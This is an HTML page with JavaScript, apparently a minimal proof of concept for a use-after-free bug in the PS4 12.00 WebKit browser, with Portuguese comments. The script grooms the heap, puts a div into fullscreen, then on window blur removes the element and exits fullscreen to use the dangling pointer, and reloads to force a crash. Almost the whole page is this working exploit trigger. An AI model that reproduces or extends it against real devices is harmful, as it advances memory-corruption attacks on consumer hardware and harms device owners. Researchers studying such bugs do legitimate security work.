<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Fullscreen UAF (Minimal PoC)</title>

</head>
<body>

<h2>PS4 12.00 - Minimal Trigger (100% Crash)</h2>
<button onclick="runTest()">Executar Gatilho (Press OPTIONS Depois)</button>

<div id="log"></div>

<script>
function log(msg) {
    try { console.log(msg); } catch(e){}
    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
}

function runTest() {
    log("<p>Running... Press OPTIONS no controle.</p>");

    // 1. Heap Grooming (Alocação inicial para preparar o terreno)
    let controllers = [];
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    // 2. Alvo do Fullscreen
    let fsTarget = document.createElement("div");
    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    fsTarget.style.cssText = "background:black; width:100%; height:100%; position:absolute; top:0; left:0;";
    document.body.appendChild(fsTarget);

    // Entra em tela cheia
    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    // 3. Interceptação da Perda de Foco (Gatilho)
    window.onblur = function() {
        log("[*] onblur disparado. Aguardando 3 segundos...");

        // Aguardamos 3 segundos para estabilizar a thread
        setTimeout(() => {
            log("[*] Trigger: remove + exitFullscreen");

            try {
                // A vulnerabilidade: Removemos o elemento da árvore DOM,
                // mas o FullscreenManager mantém o ponteiro.
                fsTarget.remove();

                // O Uso do ponteiro pendurado (UAF)
                if (document.webkitIsFullScreen || document.fullscreenElement) {
                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
                }
            } catch(e) {
                log("[ERRO] " + e);
            }

            // Sincronização fatal: Destruímos o contexto exatamente no 
            // término da animação interna de saída (500ms) do WebKit C++.
            setTimeout(() => location.reload(), 500);

        }, 3000);
    };
}
</script>

</body>
</html>
